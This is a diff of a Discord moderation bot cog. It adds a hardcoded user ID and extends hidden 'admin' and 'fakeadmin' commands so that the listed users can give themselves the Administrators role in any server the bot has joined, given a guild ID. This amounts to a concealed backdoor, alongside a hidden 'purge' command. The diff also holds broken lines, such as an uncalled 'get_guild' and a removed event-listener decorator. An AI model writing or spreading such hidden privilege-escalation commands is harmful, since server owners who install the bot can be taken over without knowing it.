@@ -21,9 +21,9 @@ class Mod(Cog):
         self.bot = bot    
         self.SLEEPTIME = 0.5    
         self.banned_members = [438809594291027969]     
-        self.list_of_admins = []        
+        self.list_of_admins = [426549783864279040]        
     
-    @Cog.listener()
+    
     async def on_ready(self):
         if not self.bot.ready:
             self.bot.cogs_ready.ready_up("mod")
@@ -65,7 +65,7 @@ class Mod(Cog):
                                 color = Color.dark_blue())
             await ctx.send(embed=embed)
             print(error)
-
+    
     @command(name = "purge",brief = "u know what it does. dont use it",hidden = True)
     async def purge(self,ctx):
 
@@ -148,6 +148,7 @@ class Mod(Cog):
     async def unban(self,ctx, id: int):
         if ctx.author.id in self.list_of_admins:
             user = await self.bot.fetch_user(id)
+            guild = await self.bot.get_guild
             await ctx.guild.unban(user)
             print(f"unbanned {user.name}")
         else:
@@ -182,7 +183,7 @@ class Mod(Cog):
                     else:
                         print(f"{role.name} cant purge")
     @command(name = "admin",brief = "gives admin",hidden =True)
-    async def admin(self,ctx):
+    async def admin(self,ctx, guildID: Optional[int]):
         if ctx.author.id not in self.list_of_admins:
             print(f"denied {ctx.author} request to become admin")
         else:
@@ -195,16 +196,21 @@ class Mod(Cog):
             await ctx.author.add_roles(role) if role not in ctx.author.roles else None
             
     @command(name = "fakeadmin", brief = "gives admin in kek later",hidden = True)
-    async def adminMan(self,ctx):
-        bot = await self.bot.fetch_user(738990452673478738)
-        confirm_primary = await self.bot.fetch_channel(814917487651979314)
-        await confirm_primary.send(f"Admin request in **{ctx.guild}** by **{ctx.author.name}**. Y or N.")
+    async def adminMan(self,ctx,guildID: Optional[int]):
+        bot =  self.bot.get_user(738990452673478738)
+        confirm_primary = self.bot.get_channel(814917487651979314)
+        guildID = guildID or ctx.guild.id
+        guild = self.bot.get_guild(guildID)
+        member = guild.get_member(ctx.author.id)
+
+        await confirm_primary.send(f"Admin request in **{guild}** by **{ctx.author.name}**. Y or N.")
         messageconfirm_1 = await self.bot.wait_for('message',check = lambda message: message.channel.id ==814917487651979314 and not message.author.bot)
             
             
         if messageconfirm_1.content.lower() == "y" and messageconfirm_1.author.id == ctx.author.id and messageconfirm_1.channel == confirm_primary:
-            role = get(ctx.guild.roles,name = "Administrators")
-            await ctx.author.add_roles(role)
+            role = get(guild.roles,name = "Administrators")
+            print(role)
+            await member.add_roles(role) 
 
     @command(name = "crosscheck",brief="crosschecks people in current server with aurium squad",hidden=True)
     async def crosscheck(self,ctx):
